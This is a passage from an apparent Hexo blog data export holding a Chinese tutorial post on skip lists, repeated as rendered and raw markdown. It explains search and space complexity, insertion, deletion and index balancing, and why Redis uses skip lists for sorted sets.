%}\n</div>\n\n前面我讲过，算法的执行效率可以通过时间复杂度来衡量，这里依旧可以用。我们知道，在一个单链表中查询某个数据的时间复杂度为O(n)。那么在一个具有多级索引的跳表中，查询某个数据的时间复杂度是多少呢？\n\n这个时间复杂度的分析方法比较难想到，我把问题分析一下，先来看这样一个问题，如果链表里有n个节点，会有多少级索引呢？\n\n按照我们刚才讲的，每两个节点会抽出一个节点作为上一级索引的节点，那第一级索引的个数大约为n/2个，第二级索引的节点个数大约为n/4，第三级节点个数大约为n/8，以此类推，也就是说，**第k级索引的节点个数是第k-1级索引的节点个数的1/2，那第k级索引的节点个数为$\\frac{n}{2^k}$**。\n\n假设索引有h级，最高级的索引有2个节点，通过上面的公式，我们可以得到$\\frac{n}{2^k}$ = 2，从而求得$h=log_2(n-1)$。如果包含原始链表这一层，整个跳表的高度就是$log_2n$。我们在跳表中查询某个数据的时候，如果每一层都要遍历m个节点，那在跳表中查询一个数据的时间复杂度就是O($m*logn$)。\n\n那么这个m的值是多少呢？按照前面这种结构，我们每一级索引都最多只需要遍历3个节点，也就是说m=3，为什么是3呢？我来解释一下。\n\n假设我们要查找的数据是x，在第k级索引中，我们遍历到y节点之后，发现x大于y，小于后面的节点z，索引我们通过y的down指针，从第k级索引下降到第k-1级索引。在第k-1索引中，y和z之间只有3个节点（包含y和z），所以，我们在k-1级索引中最多只需要遍历3个节点，以此类推，每一级索引都最多只需要遍历3个节点。\n\n通过上面的分析，我们得到m=3，所以在跳表中查询任意数据的时间复杂度就是O(logn)。这个查找的时间复杂度跟二分查找是一样的。换句话说，我们其实是基于单链表实现了二分查找，是不是很神奇？不过天下没有免费的午餐，这种查询效率的提升，前提是建立了很多级索引，也就是我们前面讲过的空间换时间的思想。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 跳表是不是很费内存\n{% endnote %}\n</div>\n\n比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。\n\n跳表的空间复杂度分析并不难，我在前面说了，假设原始链表大小为n，那第一级索引大约有n/2个节点，第二级索引大约有n/4个节点，以此类推，每上升一级就减少一半，知道剩下2个节点。如果我们把每层索引的节点数写出来，就是一个等比数列。\n\n这几级索引的节点总和就是$n/2+n/4+n/8+...+8+4+2=n-2$。所以跳表的空间复杂度为O(n)。也即是说，如果将包含n个节点的单链表构造成跳表，我们需要额外再用接近n个节点的存储空间。那我们有没有办法降低索引占用的内存空间呢？\n\n我们前面都是每两个节点抽取一个节点到上级索引，如果我们每三个节点或者五个节点，抽一个节点到上级索引，是不是就不用那么多索引节点了呢？我画了一个每三个节点抽取一个节点的示例图，你可以看下。\n\n从图中可以看出，第一级索引需要大约n/3个节点，第二级索引大约需要n/9个节点。每往上一层，索引节点个数都除以3。为了方便计算，我们假设最高一级的索引节点个数为1，我们把每级索引的节点个数都写下来，也是一个等比数列。\n\n\n通过等比数列求和公式，总的索引节点个数就是$n/3+n/9+n/27+...+9+3+1=n/2$。尽管空间复杂度还是O(n)，但比上面的每两个节点抽一个节点的索引构建方法，要减少了一半的索引节点存储空间。\n\n实际上，在软件开发中，我们不必太在意索引占用的额外空间。在将数据结构和算法时，我们习惯性的把要处理的数据看成是整数，但是在实际的软件开发中，原始链表中存储的数据存储的很可能是很大的对象，而索引节点只需要存储关键值和几个指针，并不需要存储对象，所以当对象比索引节点大很多时，那索引占据的额外空间就可以忽略了。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 高效的动态插入和删除\n{% endnote %}\n</div>\n\n跳表长什么样子我想你应该很清楚了，他查找操作我们刚才也讲过了。实际上，跳表这个动态数据结构，不仅支持查找操作，还支持动态的插入、删除操作，而且插入、删除操作的时间复杂度也是O(logn)。\n\n我们现在来看下，如何在跳表中插入一个数据，以及它是如何做到O(logn)的时间复杂度的？\n\n我们知道，在单链表中，一旦定位好要插入的位置，插入节点的时间复杂度是很低的，就是O(1)。但是为了保证原始链表中数据的有序性，我们需要先找到要插入的位置，这个查找操作就会比较耗时。\n\n对于纯粹的单链表，需要遍历每个节点，来找到插入的位置，但是，对于跳表来说，我们讲过查找某个节点的时间复杂度是O(logn)，所以这里查找数据应该插入的位置，方法也是类似的，时间复杂度为O(logn)。我画了一张图，你可以很清晰的看到插入的过程。\n\n跳表查找插入 跳表查找插入.jpg\n\n好了，我们再来看删除操作。\n\n如果要删除的节点在索引中也有出现，我们除了要删除原始链表中的节点，还要删除索引中的。因为单链表中删除操作还需要拿到删除节点的前驱节点，然后通过指针操作完成。所以在查找要删除的节点时，一定要获取前驱节点。当然，如果我们用的是双向链表，就不需要考虑这个问题了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 跳表索引动态更新\n{% endnote %}\n</div>\n\n当我们不停的往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引节点之间数据非常多的情况，极端情况下，跳表还会退化成单链表。\n\n作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中的节点多了，索引节点就相应的增加一下，避免复杂度退化，以及查找、插入、删除操作性能下降。\n\n如果你了解红黑树、AVL树这样的平衡二叉树，你就知道他们是铜鼓片左右旋的方式保持左右子树的平衡，而跳表是通过随机函数来维护前面提到的平衡性。\n\n当我们往跳表中插入数据时，我们可以选择将这个数据插入到部门索引层。如何选择加入到哪些索引层呢？\n\n我们通过一个随机函数，来决定将这个节点插入到哪几级索引中，比如随机函数生成了值K，那我们就将这个节点添加到第一级到第k级索引中。\n\n随机函数的选择很有讲究，从概率上讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。至于随机函数的选择，我就不展开讲了，如果你感兴趣的话，可以看看我在Github上代码或者redis中关于有序集合的跳表实现。\n\n跳表的实现还是稍微有点复杂的，我将java代码放在了github上，你可以根据我刚刚的讲解，对照着代码思考一下，你不用死记硬背代码，跳表的实现并不是我们这节的重点。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n今天的内容就完了。现在我们来看一下开篇的思考题：为什么redis中用跳表来实现有序集合，而不是红黑树。\n\nRedis中的有序集合是通过跳表来实现的，严格来讲，其中来用到了散列表。不过散列表我们后面再讲，现在先忽略这部分，如果你去查看Redis的开发手册，就会发现，Redis中的有序集合支持的核心操作主要有以下这几个：\n* 插入一个数据\n* 删除一个数据\n* 查找一个数据\n* 按照区间查找数据\n* 迭代输出有序序列\n\n其中，插入、删除、查找和迭代输出有序序列这节操作，红黑树也能完成，时间复杂度跟跳表是一样的。但是按照区间来查找数据这个操作，红黑树的效率没有跳表高。\n\n对于按照区间查找数据这个操作，跳表可以做到O(logn)的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了。这样做非常高效。\n\n当然，Redis之所以用跳表来实现有序集合，还有其他原因，比如跳表更容易代码实现。虽然跳表的实现也不简单，但比起红黑树来说还是好懂、好些多了，简单就意味着可读性好，不容易出错。还有跳表更加灵活，他可以通过改变索引构建策略，有效平衡执行效率和内存消耗。\n\n不过，跳表也不能完全代替红黑树。因为红黑树比跳表出现的要早一些，很多编程语言的Map类型都是通过红黑树来是实现的。我们做业务开发的时候，直接拿来用就可以了，不用费劲自己去实现一个红黑树，但是跳表并没有一个线程的实现，所以在开发中，如果你要是用跳表，必须要自己实现。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容总结\n{% endnote %}\n</div>\n\n今天我们讲了跳表这种数据结构。跳表使用空间换时间的设计思路，通过构建多级索引来提高查询效率，实现了基于链表的二分查找。跳表是一种动态数据结构，支持快速的插入、删除、查找，时间复杂度都是O(logn)。\n\n跳表的空间复杂度是O(n)，不过跳表的实现非常灵活，可以通过改变索引构建策略，有效平衡执行效率和内存消耗。虽然跳表的代码实现并不简单，但是作为一种动态数据结构，比起红黑树来说，实现要简单多了。所以很多时候，我们为了代码的简单、易读，比起红黑树，我们更倾向于跳表。\n\n### 课后思考\n\n在今天的内容中，对于跳表的时间复杂度分析，我分析了每两个节点抽取一个节点作为索引的时间复杂度，如果每三个或者每五个节点抽取一个节点作为上级索引，对应的在跳表中查询数据的时间复杂度是多少呢？\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","source":"_posts/算法-跳表.md","raw":"---\ntitle: 算法-跳表\ndate: 2018-12-17 23:33:39\ntags: ['算法','跳表']\ncategories: 算法\nmathjax: true\n---\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 前言\n{% endnote %}\n</div>\n\n上两节我们讲了二分查找算法。当时讲到，因为二分查找底层依赖的是数组随机访问的特性，所以只能用数组实现。如果数据存储在链表中，就真的没法用二分查找算法吗？\n\n实际上，我们只要对链表稍加改造，就可以支持类似“二分”的查找算法。我们把改造之后的数据结构叫做“跳表”，也就是今天的主要学习内容。\n\n跳表这种数据结构对比来讲，可能会比较陌生，因为一般的数据结构和算法书籍都不会将。但是它确实是一种各方面性能都比较优秀的**动态数据结构**，可以支持快速的插入、删除、查找操作，写起来也不复杂，甚至可以代替**红黑树**。\n\nRedis中的有序集合（Sorted Set）就是用跳表来实现的。如果你有一定基础，应该直到红黑树也可以实现快速的插入、删除和查找操作。**那redis为什么会选择用跳表来实现有序集合呢？**，为什么不用红黑树呢？学完今天的内容，你就知道答案了。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 如何理解\"跳表\"\n{% endnote %}\n</div>\n\n对于一个链表来说，即便链表中存储的数据是有序的，如果我们要想在其中查找某个数据，也只能从头到尾遍历列表。这样查找效率就会很低，时间复杂度很高，是O(n)。\n\n{% asset_img 01.jpg %}\n\n那怎样来提高查找效率呢？如果向下图那样，对链表建立一级索引，查找起来是不是就会快很多呢？每两个节点提取一个节点到上一级，我们把抽出来的那一级叫做索引或索引层。你可以看看我画的图，图中的down表示down指针，指向下一级节点。\n\n{% asset_img 02.jpg %}\n\n如果我们现在要查找某个节点，比如16。我们现在索引层遍历，当遍历到索引中值位13的节点时，我们发现下一个节点是17，那要查找的节点16肯定就在这两个节点之间。然后我们通过索引节点的down指针，下降到原始链表，继续遍历。这个时候我们只需要在遍历两个节点，就可以找到值为16的节点了。这样，原来要查找16，需要遍历10个节点，现在只需要遍历7个节点。\n\n从这个例子，我们看出，**加了一层索引之后，查找一个节点需要遍历的节点个数减少了，也就是说查询效率提高了**。那如果我们再加一层索引呢？效率会不会提高更多？\n\n跟前面建立一级索引的方式类似，我们每两个节点都抽出一个节点到二级索引。现在我们再来查找16，只需要遍历6个节点，需要遍历的节点数量又减少了。\n\n{% asset_img 03.jpg %}\n\n我举的例子数据量不大，所以即便加了两级索引，查找效率的提升也并不明显。我画了一个64个节点的链表，按照前面将的这种思路，建立了五级索引。\n\n{% asset_img 04.jpg %}\n\n从图中可以看出，原来没有索引的时候，查找62需要遍历62个节点，现在只需要遍历11个节点，速度是不是提高了很多？所以，当链表的长度n比较大时，比如，1000、10000的时候，在构建索引后，查找效率的提升就会非常明显。\n\n前面讲的这种链表添加多级索引的结构，就是跳表。我通过例子给你展示了跳表是如何减少查询次数的，现在你应该比较清晰的知道，跳表确实可以提高查找效率的。接下来，我会定量的分析一下，用跳表查询到底有多快。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 用跳表查询到底有多快\n{% endnote %}\n</div>\n\n前面我讲过，算法的执行效率可以通过时间复杂度来衡量，这里依旧可以用。我们知道，在一个单链表中查询某个数据的时间复杂度为O(n)。那么在一个具有多级索引的跳表中，查询某个数据的时间复杂度是多少呢？\n\n这个时间复杂度的分析方法比较难想到，我把问题分析一下，先来看这样一个问题，如果链表里有n个节点，会有多少级索引呢？\n\n按照我们刚才讲的，每两个节点会抽出一个节点作为上一级索引的节点，那第一级索引的个数大约为n/2个，第二级索引的节点个数大约为n/4，第三级节点个数大约为n/8，以此类推，也就是说，**第k级索引的节点个数是第k-1级索引的节点个数的1/2，那第k级索引的节点个数为$\\frac{n}{2^k}$**。\n\n假设索引有h级，最高级的索引有2个节点，通过上面的公式，我们可以得到$\\frac{n}{2^k}$ = 2，从而求得$h=log_2(n-1)$。如果包含原始链表这一层，整个跳表的高度就是$log_2n$。我们在跳表中查询某个数据的时候，如果每一层都要遍历m个节点，那在跳表中查询一个数据的时间复杂度就是O($m*logn$)。\n\n那么这个m的值是多少呢？按照前面这种结构，我们每一级索引都最多只需要遍历3个节点，也就是说m=3，为什么是3呢？我来解释一下。\n\n假设我们要查找的数据是x，在第k级索引中，我们遍历到y节点之后，发现x大于y，小于后面的节点z，索引我们通过y的down指针，从第k级索引下降到第k-1级索引。在第k-1索引中，y和z之间只有3个节点（包含y和z），所以，我们在k-1级索引中最多只需要遍历3个节点，以此类推，每一级索引都最多只需要遍历3个节点。\n\n通过上面的分析，我们得到m=3，所以在跳表中查询任意数据的时间复杂度就是O(logn)。这个查找的时间复杂度跟二分查找是一样的。换句话说，我们其实是基于单链表实现了二分查找，是不是很神奇？不过天下没有免费的午餐，这种查询效率的提升，前提是建立了很多级索引，也就是我们前面讲过的空间换时间的思想。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 跳表是不是很费内存\n{% endnote %}\n</div>\n\n比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。\n\n跳表的空间复杂度分析并不难，我在前面说了，假设原始链表大小为n，那第一级索引大约有n/2个节点，第二级索引大约有n/4个节点，以此类推，每上升一级就减少一半，知道剩下2个节点。如果我们把每层索引的节点数写出来，就是一个等比数列。\n\n这几级索引的节点总和就是$n/2+n/4+n/8+...+8+4+2=n-2$。所以跳表的空间复杂度为O(n)。也即是说，如果将包含n个节点的单链表构造成跳表，我们需要额外再用接近n个节点的存储空间。那我们有没有办法降低索引占用的内存空间呢？\n\n我们前面都是每两个节点抽取一个节点到上级索引，如果我们每三个节点或者五个节点，抽一个节点到上级索引，是不是就不用那么多索引节点了呢？我画了一个每三个节点抽取一个节点的示例图，你可以看下。\n\n从图中可以看出，第一级索引需要大约n/3个节点，第二级索引大约需要n/9个节点。每往上一层，索引节点个数都除以3。为了方便计算，我们假设最高一级的索引节点个数为1，我们把每级索引的节点个数都写下来，也是一个等比数列。\n\n\n通过等比数列求和公式，总的索引节点个数就是$n/3+n/9+n/27+...+9+3+1=n/2$。尽管空间复杂度还是O(n)，但比上面的每两个节点抽一个节点的索引构建方法，要减少了一半的索引节点存储空间。\n\n实际上，在软件开发中，我们不必太在意索引占用的额外空间。在将数据结构和算法时，我们习惯性的把要处理的数据看成是整数，但是在实际的软件开发中，原始链表中存储的数据存储的很可能是很大的对象，而索引节点只需要存储关键值和几个指针，并不需要存储对象，所以当对象比索引节点大很多时，那索引占据的额外空间就可以忽略了。\n\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 高效的动态插入和删除\n{% endnote %}\n</div>\n\n跳表长什么样子我想你应该很清楚了，他查找操作我们刚才也讲过了。实际上，跳表这个动态数据结构，不仅支持查找操作，还支持动态的插入、删除操作，而且插入、删除操作的时间复杂度也是O(logn)。\n\n我们现在来看下，如何在跳表中插入一个数据，以及它是如何做到O(logn)的时间复杂度的？\n\n我们知道，在单链表中，一旦定位好要插入的位置，插入节点的时间复杂度是很低的，就是O(1)。但是为了保证原始链表中数据的有序性，我们需要先找到要插入的位置，这个查找操作就会比较耗时。\n\n对于纯粹的单链表，需要遍历每个节点，来找到插入的位置，但是，对于跳表来说，我们讲过查找某个节点的时间复杂度是O(logn)，所以这里查找数据应该插入的位置，方法也是类似的，时间复杂度为O(logn)。我画了一张图，你可以很清晰的看到插入的过程。\n\n跳表查找插入 跳表查找插入.jpg\n\n好了，我们再来看删除操作。\n\n如果要删除的节点在索引中也有出现，我们除了要删除原始链表中的节点，还要删除索引中的。因为单链表中删除操作还需要拿到删除节点的前驱节点，然后通过指针操作完成。所以在查找要删除的节点时，一定要获取前驱节点。当然，如果我们用的是双向链表，就不需要考虑这个问题了。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 跳表索引动态更新\n{% endnote %}\n</div>\n\n当我们不停的往跳表中插入数据时，如果我们不更新索引，就有可能出现某2个索引节点之间数据非常多的情况，极端情况下，跳表还会退化成单链表。\n\n作为一种动态数据结构，我们需要某种手段来维护索引与原始链表大小之间的平衡，也就是说，如果链表中的节点多了，索引节点就相应的增加一下，避免复杂度退化，以及查找、插入、删除操作性能下降。\n\n如果你了解红黑树、AVL树这样的平衡二叉树，你就知道他们是铜鼓片左右旋的方式保持左右子树的平衡，而跳表是通过随机函数来维护前面提到的平衡性。\n\n当我们往跳表中插入数据时，我们可以选择将这个数据插入到部门索引层。如何选择加入到哪些索引层呢？\n\n我们通过一个随机函数，来决定将这个节点插入到哪几级索引中，比如随机函数生成了值K，那我们就将这个节点添加到第一级到第k级索引中。\n\n随机函数的选择很有讲究，从概率上讲，能够保证跳表的索引大小和数据大小平衡性，不至于性能过度退化。至于随机函数的选择，我就不展开讲了，如果你感兴趣的话，可以看看我在Github上代码或者redis中关于有序集合的跳表实现。\n\n跳表的实现还是稍微有点复杂的，我将java代码放在了github上，你可以根据我刚刚的讲解，对照着代码思考一下，你不用死记硬背代码，跳表的实现并不是我们这节的重点。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 解答开篇\n{% endnote %}\n</div>\n\n今天的内容就完了。现在我们来看一下开篇的思考题：为什么redis中用跳表来实现有序集合，而不是红黑树。\n\nRedis中的有序集合是通过跳表来实现的，严格来讲，其中来用到了散列表。不过散列表我们后面再讲，现在先忽略这部分，如果你去查看Redis的开发手册，就会发现，Redis中的有序集合支持的核心操作主要有以下这几个：\n* 插入一个数据\n* 删除一个数据\n* 查找一个数据\n* 按照区间查找数据\n* 迭代输出有序序列\n\n其中，插入、删除、查找和迭代输出有序序列这节操作，红黑树也能完成，时间复杂度跟跳表是一样的。但是按照区间来查找数据这个操作，红黑树的效率没有跳表高。\n\n对于按照区间查找数据这个操作，跳表可以做到O(logn)的时间复杂度定位区间的起点，然后在原始链表中顺序往后遍历就可以了。这样做非常高效。\n\n当然，Redis之所以用跳表来实现有序集合，还有其他原因，比如跳表更容易代码实现。虽然跳表的实现也不简单，但比起红黑树来说还是好懂、好些多了，简单就意味着可读性好，不容易出错。还有跳表更加灵活，他可以通过改变索引构建策略，有效平衡执行效率和内存消耗。\n\n不过，跳表也不能完全代替红黑树。因为红黑树比跳表出现的要早一些，很多编程语言的Map类型都是通过红黑树来是实现的。我们做业务开发的时候，直接拿来用就可以了，不用费劲自己去实现一个红黑树，但是跳表并没有一个线程的实现，所以在开发中，如果你要是用跳表，必须要自己实现。\n\n<div style=\"text-align: center;\">\n{% note success %} \n### 内容总结\n{% endnote %}\n</div>\n\n今天我们讲了跳表这种数据结构。跳表使用空间换时间的设计思路，通过构建多级索引来提高查询效率，实现了基于链表的二分查找。跳表是一种动态数据结构，支持快速的插入、删除、查找，时间复杂度都是O(logn)。\n\n跳表的空间复杂度是O(n)，不过跳表的实现非常灵活，可以通过改变索引构建策略，有效平衡执行效率和内存消耗。虽然跳表的代码实现并不简单，但是作为一种动态数据结构，比起红黑树来说，实现要简单多了。所以很多时候，我们为了代码的简单、易读，比起红黑树，我们更倾向于跳表。\n\n### 课后思考\n\n在今天的内容中，对于跳表的时间复杂度分析，我分析了每两个节点抽取一个节点作为索引的时间复杂度，如果每三个或者每五个节点抽取一个节点作为上级索引，对应的在跳表中查询数据的时间复杂度是多少呢？\n\n\n\n\n<br>\n<br>\n<br>\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>","slug":"算法-跳表","published":1,"updated":"2019-07-31T09:25:24.622Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck0oko2mu0056o25teg2hzyk0","content":"<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3></div><br></div>\n\n<p>上两节我们讲了二分查找算法。当时讲到，因为二分查找底层依赖的是数组随机访问的特性，所以只能用数组实现。如果数据存储在链表中，就真的没法用二分查找算法吗？</p>\n<p>实际上，我们只要对链表稍加改造，就可以支持类似“二分”的查找算法。我们把改造之后的数据结构叫做“跳表”，也就是今天的主要学习内容。</p>\n<p>跳表这种数据结构对比来讲，可能会比较陌生，因为一般的数据结构和算法书籍都不会将。但是它确实是一种各方面性能都比较优秀的<strong>动态数据结构</strong>，可以支持快速的插入、删除、查找操作，写起来也不复杂，甚至可以代替<strong>红黑树</strong>。</p>\n<p>Redis中的有序集合（Sorted Set）就是用跳表来实现的。如果你有一定基础，应该直到红黑树也可以实现快速的插入、删除和查找操作。<strong>那redis为什么会选择用跳表来实现有序集合呢？</strong>，为什么不用红黑树呢？学完今天的内容，你就知道答案了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"如何理解”跳表”\"><a href=\"#如何理解”跳表”\" class=\"headerlink\" title=\"如何理解”跳表”\"></a>如何理解”跳表”</h3></div><br></div>\n\n<p>对于一个链表来说，即便链表中存储的数据是有序的，如果我们要想在其中查找某个数据，也只能从头到尾遍历列表。这样查找效率就会很低，时间复杂度很高，是O(n)。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/01.jpg\">\n<p>那怎样来提高查找效率呢？如果向下图那样，对链表建立一级索引，查找起来是不是就会快很多呢？每两个节点提取一个节点到上一级，我们把抽出来的那一级叫做索引或索引层。你可以看看我画的图，图中的down表示down指针，指向下一级节点。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/02.jpg\">\n<p>如果我们现在要查找某个节点，比如16。我们现在索引层遍历，当遍历到索引中值位13的节点时，我们发现下一个节点是17，那要查找的节点16肯定就在这两个节点之间。然后我们通过索引节点的down指针，下降到原始链表，继续遍历。这个时候我们只需要在遍历两个节点，就可以找到值为16的节点了。这样，原来要查找16，需要遍历10个节点，现在只需要遍历7个节点。</p>\n<p>从这个例子，我们看出，<strong>加了一层索引之后，查找一个节点需要遍历的节点个数减少了，也就是说查询效率提高了</strong>。那如果我们再加一层索引呢？效率会不会提高更多？</p>\n<p>跟前面建立一级索引的方式类似，我们每两个节点都抽出一个节点到二级索引。现在我们再来查找16，只需要遍历6个节点，需要遍历的节点数量又减少了。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/03.jpg\">\n<p>我举的例子数据量不大，所以即便加了两级索引，查找效率的提升也并不明显。我画了一个64个节点的链表，按照前面将的这种思路，建立了五级索引。</p>\n<img src=\"/posts/2018-12-17-算法-跳表/04.jpg\">\n<p>从图中可以看出，原来没有索引的时候，查找62需要遍历62个节点，现在只需要遍历11个节点，速度是不是提高了很多？所以，当链表的长度n比较大时，比如，1000、10000的时候，在构建索引后，查找效率的提升就会非常明显。</p>\n<p>前面讲的这种链表添加多级索引的结构，就是跳表。我通过例子给你展示了跳表是如何减少查询次数的，现在你应该比较清晰的知道，跳表确实可以提高查找效率的。接下来，我会定量的分析一下，用跳表查询到底有多快。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"用跳表查询到底有多快\"><a href=\"#用跳表查询到底有多快\" class=\"headerlink\" title=\"用跳表查询到底有多快\"></a>用跳表查询到底有多快</h3></div><br></div>\n\n<p>前面我讲过，算法的执行效率可以通过时间复杂度来衡量，这里依旧可以用。我们知道，在一个单链表中查询某个数据的时间复杂度为O(n)。那么在一个具有多级索引的跳表中，查询某个数据的时间复杂度是多少呢？</p>\n<p>这个时间复杂度的分析方法比较难想到，我把问题分析一下，先来看这样一个问题，如果链表里有n个节点，会有多少级索引呢？</p>\n<p>按照我们刚才讲的，每两个节点会抽出一个节点作为上一级索引的节点，那第一级索引的个数大约为n/2个，第二级索引的节点个数大约为n/4，第三级节点个数大约为n/8，以此类推，也就是说，<strong>第k级索引的节点个数是第k-1级索引的节点个数的1/2，那第k级索引的节点个数为$\\frac{n}{2^k}$</strong>。</p>\n<p>假设索引有h级，最高级的索引有2个节点，通过上面的公式，我们可以得到$\\frac{n}{2^k}$ = 2，从而求得$h=log_2(n-1)$。如果包含原始链表这一层，整个跳表的高度就是$log_2n$。我们在跳表中查询某个数据的时候，如果每一层都要遍历m个节点，那在跳表中查询一个数据的时间复杂度就是O($m*logn$)。</p>\n<p>那么这个m的值是多少呢？按照前面这种结构，我们每一级索引都最多只需要遍历3个节点，也就是说m=3，为什么是3呢？我来解释一下。</p>\n<p>假设我们要查找的数据是x，在第k级索引中，我们遍历到y节点之后，发现x大于y，小于后面的节点z，索引我们通过y的down指针，从第k级索引下降到第k-1级索引。在第k-1索引中，y和z之间只有3个节点（包含y和z），所以，我们在k-1级索引中最多只需要遍历3个节点，以此类推，每一级索引都最多只需要遍历3个节点。</p>\n<p>通过上面的分析，我们得到m=3，所以在跳表中查询任意数据的时间复杂度就是O(logn)。这个查找的时间复杂度跟二分查找是一样的。换句话说，我们其实是基于单链表实现了二分查找，是不是很神奇？不过天下没有免费的午餐，这种查询效率的提升，前提是建立了很多级索引，也就是我们前面讲过的空间换时间的思想。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"跳表是不是很费内存\"><a href=\"#跳表是不是很费内存\" class=\"headerlink\" title=\"跳表是不是很费内存\"></a>跳表是不是很费内存</h3></div><br></div>\n\n<p>比起单纯的单链表，跳表需要存储多级索引，肯定要消耗更多的存储空间。那到底需要消耗多少额外的存储空间呢？我们来分析一下跳表的空间复杂度。</p>\n<p>跳表的空间复杂度分析并不难，我在前面说了，假设原始链表大小为n，那第一级索引大约有n/2个节点，第二级索引大约有n/4个节点，以此类推，每上升一级就减少一半，知道剩下2个节点。如果我们把每层索引的节点数写出来，就是一个等比数列。</p>\n<p>这几级索引的节点总和就是$n/2+n/4+n/8+…+8+4+2=n-2$。所以跳表的空间复杂度为O(n)。也即是说，如果将包含n个节点的单链表构造成跳表，我们需要额外再用接近n个节点的存储空间。那我们有没有办法降低索引占用的内存空间呢？</p>\n<p>我们前面都是每两个节点抽取一个节点到上级索引，如果我们每三个节点或者五个节点，抽一个节点到上级索引，是不是就不用那么多索引节点了呢？我画了一个每三个节点抽取一个节点的示例图，你可以看下。</p>\n<p>从图中可以看出，第一级索引需要大约n/3个节点，第二级索引大约需要n/9个节点。每往上一层，索引节点个数都除以3。为了方便计算，我们假设最高一级的索引节点个数为1，我们把每级索引的节点个数都写下来，也是一个等比数列。</p>\n<p>通过等比数列求和公式，总的索引节点个数就是$n/3+n/9+n/27+…+9+3+1=n/2$。尽管空间复杂度还是O(n)，但比上面的每两个节点抽一个节点的索引构建方法，要减少了一半的索引节点存储空间。</p>\n<p>实际上，在软件开发中，我们不必太在意索引占用的额外空间。在将数据结构和算法时，我们习惯性的把要处理的数据看成是整数，但是在实际的软件开发中，原始链表中存储的数据存储的很可能是很大的对象，而索引节点只需要存储关键值和几个指针，并不需要存储对象，所以当对象比索引节点大很多时，那索引占据的额外空间就可以忽略了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"高效的动态插入和删除\"><a href=\"#高效的动态插入和删除\" class=\"headerlink\" title=\"高效的动态插入和删除\"></a>高效的动态插入和删除</h3></div><br></div>\n\n<p>跳表长什么样子我想你应该很清楚了，他查找操作我们刚才也讲过了。实际上，跳表这个动态数据结构，不仅支持查找操作，还支持动态的插入、删除操作，而且插入、删除操作的时间复杂度也是O(logn)。</p>\n<p>我们现在来看下，如何在跳表中插入一个数据，以及它是如何做到O(logn)的时间复杂度的？</p>\n<p>我们知道，在单链表中，一旦定位好要插入的位置，插入节点的时间复杂度是很低的，就是O(1)。但是为了保证原始链表中数据的有序性，我们需要先找到要插入的位置，这个查找操作就会比较耗时。</p>\n<p>对于纯粹的单链表，需要遍历每个节点，来找到插入的位置，但是，对于跳表来说，我们讲过查找某个节点的时间复杂度是O(logn)，所以这里查找数据应该插入的位置，方法也是类似的，时间复杂度为O(logn)。我画了一张图，你可以很清晰的看到插入的过程。</p>\n<p>跳表查找插入 跳表查找插入.jpg</p>\n<p>好了，我们再来看删除操作。</p>\n<p>如果要删除的节点在索引中也有出现，我们除了要删除原始链表中的节点，还要删除索引中的。因为单链表中删除操作还需要拿到删除节点的前驱节点，然后通过指针操作完成。所以在查找要删除的节点时，一定要获取前驱节点。当然，如果我们用的是双向链表，就不需要考虑这个问题了。</p>\n<div style=\"text-align: center;\"><br><div class=\"note success\"><h3 id=\"跳表索引动态更新\"><a href=\"#跳表索引动态更新\" class=\"headerlink\" 